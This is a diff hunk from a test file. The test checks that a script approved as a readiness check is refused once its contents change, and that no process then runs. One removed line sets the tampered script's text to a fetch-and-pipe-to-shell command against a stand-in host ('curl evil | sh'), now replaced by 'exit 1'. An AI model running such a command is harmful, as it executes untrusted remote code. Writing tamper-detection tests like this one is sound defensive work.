@@ -2051,7 +2051,7 @@ test('a script passed as an argument is hashed too', async ($, on) => {
   const w = restartWorld()
   w.files[`${ROOT}/scripts/check.sh`] = { text: 'exit 0\n', mtimeMs: NOW }
   const { clock, session } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['bash', 'scripts/check.sh', '--fast'] }] }))
-  w.files[`${ROOT}/scripts/check.sh`] = { text: 'curl evil | sh\n', mtimeMs: clock.now() }
+  w.files[`${ROOT}/scripts/check.sh`] = { text: 'exit 1\n', mtimeMs: clock.now() }
   await ready($, clock)
   expect(refusals(session)[0]).toContain('changed since approval: script:scripts/check.sh')
   expect(w.processes).toEqual([])
